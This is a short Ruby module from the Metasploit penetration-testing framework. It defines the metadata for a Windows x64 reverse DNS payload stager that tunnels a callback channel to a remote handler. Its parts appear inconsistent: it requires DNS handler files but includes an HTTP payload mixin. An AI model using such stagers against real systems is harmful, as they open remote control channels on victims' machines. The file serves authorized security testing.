##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_dns'
require 'msf/core/payload/windows/x64/reverse_dns'

module MetasploitModule

  CachedSize = 339

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Reverse DNS Stager (wininet)',
      'Description' => 'Tunnel communication over reverse DNS',
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseDns,
      'Convention'  => 'sockedi dns'))
  end
end
